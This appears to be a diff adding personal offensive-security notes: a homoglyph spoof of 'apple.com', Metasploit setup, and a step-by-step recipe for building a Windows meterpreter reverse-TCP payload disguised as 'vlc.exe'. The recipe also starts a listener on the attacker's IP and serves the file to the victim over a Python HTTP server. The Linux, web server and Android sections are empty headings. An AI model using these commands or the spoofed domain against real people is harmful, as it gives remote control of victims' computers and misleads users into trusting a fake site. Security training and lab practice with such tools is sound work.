@@ -1,0 +1,89 @@
+https://www.irongeek.com/homoglyph-attack-generator.php
+
+Real: apple.com
+FAKE: аррlе.соm
+----------------------------------------------------------------------------
+Metasploit Framework:
+`````````````````````
+Org: Rapid7
+Lang: Ruby
+DB: postgresql
+
+Community Version (free)
+Pro version (paid)
+
+CLI: msfconsole/msfpro
+GUI: armitage/cobalt Striker
+
+1) Setup msf:
+``````````````
+a) Init DB:
+````````````
+$ sudo msfdb init
+OR
+$ sudo msfdb delete
+OR
+$ sudo msfdb reinit
+
+b) Start CLI msf:
+``````````````````
+$ sudo msfconsole
+
+GUI:
+
+$ sudo apt install armitage -y
+
+$ sudo armitage
+
+
+
+1283 auxiliary
+2496 exploits
+1610 payloads
+431 post 
+49 encoders
+9 evasion
+13 nops
+
+
+1610 payloads:
+	``````````
+Victims:
+
++ Windows
+``````````
+a) Generate the payload for target OS:
+```````````````````````````````````````
+msf6> use payload/windows/x64/meterpreter/reverse_tcp
+msf6> show options
+msf6> set LHOST x.x.x.x (attacker'sIP)
+msf6> set LPORT 9898
+msf6> generate -f exe -o /home/kali/vlc.exe
+
+
+b) Start reverse handler:
+``````````````````````````
+msf6> use exploit/multi/handler
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6> set LHOST x.x.x.x (attacker'sIP)
+msf6> set LPORT 9898
+msf6> exploit
+
+c) Payload to victim:
+``````````````````````
+# cd /home/kali
+# python3 -m http.server --bind x.x.x.x 80
+
+
+
+
+
+
+
+
+
++ Linux/Unix
++ Web Servers
++ Android
+
+
